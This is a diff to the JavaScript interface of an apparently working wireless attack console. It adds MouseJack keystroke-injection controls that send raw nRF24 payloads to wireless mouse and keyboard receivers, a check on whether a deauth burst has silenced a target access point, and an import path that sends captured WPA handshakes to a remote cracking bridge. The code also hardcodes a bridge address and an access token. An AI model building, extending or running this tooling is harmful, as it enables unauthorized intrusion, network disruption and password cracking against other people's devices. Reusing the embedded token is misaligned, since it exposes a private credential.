@@ -8,11 +8,13 @@ import { encodeFrame, encodeCmd, FrameDecoder, payloadJson, TYPE, typeName } fro
 import { UsbTransport } from './transport.js';
 import { Icon, STAGE_ICONS } from './icons.js';
 import { CaptureSession } from './capture.js';
-import { analyzeChunks, findings } from './analyze.js';
+import { analyzeChunks, findings, kaputCheck } from './analyze.js';
 import { plan, reportText, topTarget } from './analysis.js';
 import { attackList, blockedOnTransmit } from './attacks.js';
-import { buildDeauth, buildProbeResponse, buildBeaconPool, SECURITY } from './attack.js';
+import { buildDeauth, buildProbeResponse, buildBeaconPool, SECURITY, MOUSEJACK_PAYLOADS } from './attack.js';
 import { extractHandshakes, hashFile } from './crack.js';
+import { importCapture, describeImport } from './import.js';
+import { takeSharedCapture } from './native-import.js';
 import { CrackBridge } from './bridge.js';
 import './gps.js';    // window.GPS
 import './hashstore.js'; // window.HashStore
@@ -803,12 +805,17 @@ const BRIDGE_DEFAULT_URL = 'http://junebug.tailb06fe4.ts.net:8099';
 const BRIDGE_DEFAULT_TOKEN = 'jUsaQB4TFRLVeo977u3XyxgZskrov8GN';
 
 let handshakeResult = null;   // crack extraction over the current capture
+// A capture that came in as a file rather than off the wire. Kept apart from
+// `capture` (the live session, which has start/stop/sync and a real board behind
+// it) so an import can never look like a device that is connected.
+let importedCapture = null;   // { name, kind, chunks, meta, warnings }
 let bridgeStatus = null;      // last /health reading, null until tested
 let bridgeError = null;
 let crackJob = null;          // live progress: {state, progress, speed_hs, ...}
 let crackRunning = false;
 let txResult = null;          // last burst: {phase, requested, sent, failed, ...}
 let txRunning = false;
+let kaputResult = null;       // last kaput guard check: {alive, beacons, chunks}
 let karmaRunning = false;
 let karmaResult = null;
 let manaRunning = false;
@@ -921,7 +928,9 @@ function attackContext() {
   // If an analysis plan exists, the captured data is real — the plan was built
   // from it. Fall back to the plan as proof capture ran, in case the writer
   // reference was cleared by a re-render or navigation.
-  const hasCaptureProof = captured || (analysisPlan && analysisPlan.targets.length > 0);
+  // An import counts as capture proof too: the file *is* the capture, and every
+  // stage downstream (extract, crack) works on it exactly as it does on a live one.
+  const hasCaptureProof = captured || (analysisPlan && analysisPlan.targets.length > 0) || !!importedCapture;
   return {
     hasCapture: hasCaptureProof,
     hasHandshake: !!handshakeResult?.handshakes?.length,
@@ -962,6 +971,7 @@ function renderAttackPanel(box) {
       ${a.id === 'handshake' ? deauthActionHtml(a) : ''}
       ${a.id === 'karma' ? karmaActionHtml(a) : ''}
       ${a.id === 'mana' ? manaActionHtml(a) : ''}
+      ${a.id === 'mousejack' ? mousejackActionHtml(a) : ''}
     </div>`;
   }).join('');
 
@@ -1099,6 +1109,31 @@ function renderAttackPanel(box) {
     localStorage.setItem('attackBssid', e.target.value.trim());
   });
   $('#manaPopulate')?.addEventListener('click', onManaPopulate);
+
+  // ── mousejack event handlers ─────────────────────────────────────────────
+  $('#mjGo')?.addEventListener('click', onMousejackSend);
+  $('#mjClear')?.addEventListener('click', () => {
+    state.mjResult = null; state.mjSending = false;
+    renderStagePanel();
+  });
+  $('#mjPayload')?.addEventListener('change', (e) => {
+    const p = MOUSEJACK_PAYLOADS.find(p => p.id === e.target.value);
+    if (p && p.hex) {
+      $('#mjHex').value = p.hex;
+      $('#mjInfo').textContent = escapeHtml(p.description);
+    } else if (p) {
+      $('#mjInfo').textContent = escapeHtml(p.description || 'Type hex directly below.');
+    }
+  });
+  $('#mjAddr')?.addEventListener('change', (e) => {
+    localStorage.setItem('mousejackAddr', e.target.value.trim());
+  });
+  $('#mjCh')?.addEventListener('change', (e) => {
+    localStorage.setItem('mousejackCh', e.target.value);
+  });
+  $('#mjCount')?.addEventListener('change', (e) => {
+    localStorage.setItem('mousejackCount', e.target.value);
+  });
 
   // ── preset event handlers ──────────────────────────────────────────────
 
@@ -1425,12 +1460,18 @@ function deauthActionHtml(a) {
     const r = txResult;
     const ok = r.sent > 0;
     const clamped = r.requested !== r.count;
+    const kaputLine = kaputResult
+      ? kaputResult.alive
+        ? `<div class="crackmeta">${Icon('signal', { size: 14 })}Kaput Guard: AP alive — deauth working (not kaput) · ${kaputResult.beacons} beacon(s) from target</div>`
+        : `<div class="crackmeta" style="color:var(--accent)">${Icon('alert', { size: 14 })}Kaput Guard: AP silent — deauth may have killed it (true kaput) · no beacons from target in ${kaputResult.chunks} frames</div>`
+      : '';
     return `<div class="crackbox ${ok ? 'win' : ''}">
       ${head}
       <div class="crackstate">${ok ? Icon('check', { size: 15 }) + 'burst done' : Icon('alert', { size: 15 }) + 'nothing went out'}</div>
       <div class="crackmeta">${r.sent} of ${r.count} frames sent · ${r.failed} refused by the driver
         · channel ${r.channel}${clamped ? ` · clamped from ${r.requested}` : ''}</div>
       ${r.note ? `<div class="crackmeta">${escapeHtml(r.note)}</div>` : ''}
+      ${kaputLine}
       <div class="row" style="margin-top:8px">
         <button id="deauthGo" class="ghost">${Icon('refresh', { size: 18 })}Fire again</button>
       </div>
@@ -1613,6 +1654,76 @@ function manaActionHtml(a) {
   </div>`;
 }
 
+/** MouseJack (nRF24) controls. No WiFi transmit path needed — this is a separate SPI radio. */
+function mousejackActionHtml(a) {
+  if (!a.ready) return '';
+  const addrSaved = localStorage.getItem('mousejackAddr') || '';
+  const chSaved = localStorage.getItem('mousejackCh') || '5';
+  const countSaved = localStorage.getItem('mousejackCount') || '3';
+  const mjResult = state.mjResult || null;
+
+  if (state.mjSending) {
+    return `<div class="crackbox">
+      <div class="crackstate">${Icon('antenna', { size: 15 })}transmitting…</div>
+      <div class="crackmeta">${state.mjSent || 0} packets sent · channel ${state.mjChannel || '?'}</div>
+    </div>`;
+  }
+
+  if (mjResult) {
+    const ok = mjResult.sent;
+    return `<div class="crackbox ${ok ? 'win' : ''}">
+      <div class="crackstate">${ok ? Icon('check', { size: 15 }) + 'burst done' : Icon('alert', { size: 15 }) + 'failed'}</div>
+      <div class="crackmeta">${mjResult.sent ? mjResult.count + ' packets' : '0 packets'} · channel ${mjResult.channel}
+        ${mjResult.fifo_st != null ? ' · fifo_st: 0x' + mjResult.fifo_st.toString(16) : ''}</div>
+      <div class="row" style="margin-top:8px">
+        <button id="mjGo" class="ghost">${Icon('refresh', { size: 18 })}Send again</button>
+      </div>
+    </div>`;
+  }
+
+  const payloadOptions = MOUSEJACK_PAYLOADS.map((p) =>
+    `<option value="${p.id}"${p.hex ? '' : ' selected'}>${escapeHtml(p.name)}</option>`
+  ).join('');
+
+  return `<div class="crackbox">
+    <div class="crackmeta">Sends raw nRF24 packets at a Logitech Unifying (or other nRF24-based) receiver.
+      The nRF24 module is a separate 2.4 GHz radio — this does not use the ESP32's WiFi at all.
+      Set the receiver's 5-byte address, channel, and payload, then fire.</div>
+    <div class="fields">
+      <label class="field">
+        <span>Receiver address (5 bytes hex)</span>
+        <input id="mjAddr" type="text" autocapitalize="off" spellcheck="false"
+               placeholder="e7e7e7e7e7" value="${escapeHtml(addrSaved)}"
+               style="font-family:monospace;font-size:12px">
+      </label>
+      <label class="field">
+        <span>Channel</span>
+        <input id="mjCh" type="number" value="${escapeHtml(chSaved)}" min="0" max="125" style="width:3rem">
+      </label>
+    </div>
+    <div class="fields">
+      <label class="field">
+        <span>Canned payload</span>
+        <select id="mjPayload">${payloadOptions}</select>
+      </label>
+      <label class="field">
+        <span>Burst</span>
+        <input id="mjCount" type="number" value="${escapeHtml(countSaved)}" min="1" max="20" style="width:3rem">
+      </label>
+    </div>
+    <label class="field">
+      <span>Hex payload (max 32 bytes)</span>
+      <textarea id="mjHex" rows="2" autocapitalize="off" spellcheck="false"
+        placeholder="e7e7e7e7e700010203" style="font-family:monospace;font-size:12px"></textarea>
+    </label>
+    <div class="crackmeta" id="mjInfo">Select a canned payload or type hex directly. Max 64 hex chars (32 bytes).</div>
+    <div class="row" style="margin-top:8px">
+      <button id="mjGo" class="primary">${Icon('antenna', { size: 18 })}Send</button>
+      <button id="mjClear" class="ghost" style="font-size:12px">${Icon('close', { size: 14 })}Clear</button>
+    </div>
+  </div>`;
+}
+
 /** Turn a frame's bytes into the hex TX_FRAME expects. */
 function frameHex(u8) {
   return Array.from(u8).map((b) => b.toString(16).padStart(2, '0')).join('');
@@ -1727,6 +1838,16 @@ async function syncAfterBurst() {
   } catch (e) {
     log('err', 'post-burst extract: ' + e.message);
   }
+  // Kaput Guard: check if the target AP is still beaconing
+  if (selectedTargetIndex != null && analysisPlan?.targets[selectedTargetIndex]) {
+    const target = analysisPlan.targets[selectedTargetIndex];
+    try {
+      kaputResult = kaputCheck(w.chunks, target.bssid);
+      log('ev', `kaput: target ${target.bssid} ${kaputResult.alive ? 'alive' : 'silent'} (${kaputResult.beacons} beacons)`);
+    } catch (e) {
+      log('err', 'kaput: ' + e.message);
+    }
+  }
   // Check bridge status if not done recently
   if (!bridgeStatus?.ok && !bridgeError) {
     try {
@@ -1762,6 +1883,49 @@ async function onDeauthStop() {
   renderStagePanel();
 }
 
+/** MouseJack: send nRF24 packets at a receiver. */
+async function onMousejackSend() {
+  const hex = $('#mjHex')?.value?.trim();
+  const addr = $('#mjAddr')?.value?.trim();
+  const ch = parseInt($('#mjCh')?.value || '2', 10);
+  const count = parseInt($('#mjCount')?.value || '1', 10);
+
+  if (!hex) { log('err', 'mousejack: no hex payload'); return; }
+  const cleaned = hex.replace(/\s+/g, '');
+  if (cleaned.length > 64) { log('err', 'mousejack: payload too long (max 64 hex chars = 32 bytes)'); return; }
+  if (cleaned.length % 2) { log('err', 'mousejack: hex must have even length'); return; }
+
+  state.mjSending = true;
+  state.mjSent = 0;
+  state.mjChannel = ch;
+  state.mjResult = null;
+  renderStagePanel();
+
+  for (let i = 0; i < count; i++) {
+    try {
+      const args = { hex: cleaned, channel: ch };
+      if (addr) args.addr = addr;
+      const resp = await request('NRF_SEND', args, { timeoutMs: 5000 });
+      if (!resp?.ok) {
+        log('err', `mousejack #${i + 1}: firmware refused (${resp?.error || 'no error'})`);
+        break;
+      }
+      state.mjSent++;
+      state.mjResult = { sent: true, count: state.mjSent, channel: ch, fifo_st: resp.fifo_st };
+      log('ev', `mousejack #${i + 1}: sent on ch${ch} (fifo_st: 0x${(resp.fifo_st ?? 0).toString(16)})`);
+    } catch (e) {
+      log('err', `mousejack #${i + 1}: ${e.message}`);
+      break;
+    }
+  }
+
+  state.mjSending = false;
+  if (!state.mjResult) {
+    state.mjResult = { sent: false, count: 0, channel: ch };
+  }
+  renderStagePanel();
+}
+
 async function onBridgeTest() {
   bridgeError = null; bridgeStatus = null;
   renderStagePanel();
@@ -1792,6 +1956,137 @@ function onExtractHandshakes() {
   if (handshakeResult.incomplete.length) {
     log('ev', `${handshakeResult.incomplete.length} key exchange(s) were incomplete`);
   }
+  renderStagePanel();
+}
+
+// ── import a capture from outside the app ────────────────────────────────────
+//
+// The portal runs in another app; this is where what it produces lands. A handshake
+// arrives as a file, and from here on it is indistinguishable from a captured one —
+// same handshakeResult, same crack stage, same bridge.
+
+/** A file chosen from the picker. Reads it, then hands the bytes to the one importer. */
+async function onImportPick(file) {
+  if (!file) return;
+  const btn = $('#importBtn');
+  if (btn) btn.disabled = true;
+  try {
+    const bytes = new Uint8Array(await file.arrayBuffer());
+    await onImportPickBytes(bytes, file.name);
+  } catch (e) {
+    importedCapture = null;
+    log('err', 'import: ' + e.message);
+    renderImportResult();
+  } finally {
+    if (btn) btn.disabled = false;
+  }
+}
+
+/**
+ * Import bytes from anywhere — a picked file, or a capture shared in from another app.
+ * One importer, so a shared capture cannot behave differently from a chosen one.
+ */
+async function onImportPickBytes(bytes, name) {
+  log('ev', `import: reading ${name} (${fmtBytes(bytes.length)})`);
+  try {
+    const r = importCapture(bytes, name);
+
+    for (const w of r.warnings) log('ev', 'import warning: ' + w);
+
+    if (!r.handshakes.length && !r.chunks.length) {
+      importedCapture = null;
+      log('err', `import: nothing usable in ${name}`);
+      return;
+    }
+
+    // A 22000 import carries no frames, so analysisPlan is left alone: there is
+    // nothing to analyze, and inventing targets would put fiction on the screen.
+    if (r.chunks.length) {
+      analysisPlan = analyzeChunks(r.chunks);
+      log('ev', `import: ${analysisPlan.targets.length} target(s) in the file`);
+    }
+    importedCapture = { name, kind: r.kind, chunks: r.chunks, meta: r.meta, warnings: r.warnings };
+    handshakeResult = { handshakes: r.handshakes, incomplete: r.incomplete, counts: r.counts };
+    crackJob = null;
+
+    log('ev', describeImport(r));
+    for (const h of r.handshakes) {
+      log('ev', `import: ${h.type} ${h.bssid} · ${h.essid || '(hidden)'} · ${(h.messages || []).join('+')}`);
+    }
+
+    // Keep it with the other hashes so it survives a reload.
+    if (window.HashStore) {
+      for (const h of r.handshakes) {
+        window.HashStore.addHash(h.line, h.bssid, h.essid || '', null, null, null, null);
+      }
+    }
+  } catch (e) {
+    importedCapture = null;
+    log('err', 'import: ' + e.message);
+  } finally {
+    renderImportResult();
+    revealCrackAfterImport();
+  }
+}
+
+/** Pick up a capture another app shared in (Android's "Share → Radio Console"). */
+async function checkSharedCapture() {
+  try {
+    return await takeSharedCapture(({ name, bytes }) => {
+      log('ev', `import: received ${name} from another app`);
+      onImportPickBytes(bytes, name);
+    });
+  } catch (e) {
+    log('err', 'import: ' + e.message);
+    return false;
+  }
+}
+
+/** The imported-hash list and the way into the crack stage. */
+function renderImportResult() {
+  const el = $('#importResult');
+  if (!el) return;
+  const ic = importedCapture;
+  const hs = handshakeResult?.handshakes || [];
+  if (!ic && !hs.length) { el.innerHTML = ''; return; }
+
+  const rows = hs.map((h) => `
+    <div style="display:flex;gap:8px;align-items:baseline;font-size:12px;padding:4px 0;border-top:1px solid var(--line)">
+      <span style="font-variant-numeric:tabular-nums;color:var(--muted)">${escapeHtml(h.bssid)}</span>
+      <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(h.essid || '(hidden)')}</span>
+      <span style="color:var(--accent)">${escapeHtml(h.type)}</span>
+    </div>`).join('');
+
+  // Every value below is attacker-supplied — an SSID is a string someone else chose,
+  // and it arrives from a file rather than from us. All of it goes through escapeHtml;
+  // the only unescaped text is our own markup and Icon()'s own SVG.
+  el.innerHTML = `
+    <div style="margin-top:10px;font-size:12.5px">
+      ${Icon('check', { size: 15 })} ${hs.length} handshake(s)${ic ? ` from ${escapeHtml(ic.name)}` : ''}
+      ${ic?.meta?.truncated ? ' · file was truncated' : ''}
+    </div>
+    ${rows}
+    ${hs.length ? `<button class="block primary" id="importCrack" style="margin-top:10px">
+      ${Icon('key', { size: 18 })}Crack on the bridge</button>` : ''}
+  `;
+  // The strategy pickers and live progress already live in the attack stage, so
+  // this opens that rather than growing a second copy of the crack UI here.
+  $('#importCrack')?.addEventListener('click', revealCrackAfterImport);
+}
+
+/**
+ * Open the attack stage on the strength of an import alone.
+ *
+ * The stage panel is normally gated on a connected device, but cracking an imported
+ * file needs no board — the phone extracts and the bridge searches. So the flow is
+ * revealed here instead of waiting for a device that will never appear.
+ */
+function revealCrackAfterImport() {
+  if (!handshakeResult?.handshakes?.length) return;
+  $('#consoleCard2')?.classList.remove('hidden');
+  $('#consoleCard3')?.classList.remove('hidden');
+  state.stage = 'attack';
+  renderStages();
   renderStagePanel();
 }
 
@@ -2001,6 +2296,26 @@ function boot() {
     setConnected(false);
   });
   $('#resetBtn')?.addEventListener('click', resetAll);
+
+  // ── import ──────────────────────────────────────────────────────────────────
+  // Label set here like every other button in this file (index.html ships them
+  // empty; verify_ui.mjs fails on a blank one).
+  $('#importBtn').innerHTML = Icon('save', { size: 18 }) + 'Choose file…';
+  $('#importBtn').addEventListener('click', () => $('#importFile').click());
+  $('#importFile').addEventListener('change', (e) => {
+    const f = e.target.files?.[0];
+    // Clear the input so picking the same file twice in a row still fires.
+    e.target.value = '';
+    onImportPick(f);
+  });
+
+  // A share can arrive before this runs (cold start from the share sheet) or while
+  // the app is already open (Android reuses the task, so onNewIntent fires and the
+  // activity resumes). Both land here: once now, and once on every return to front.
+  checkSharedCapture();
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden) checkSharedCapture();
+  });
 
   // Wipe any stale bridge token from localStorage so the hardcoded default wins
   const savedToken = localStorage.getItem('bridgeToken');
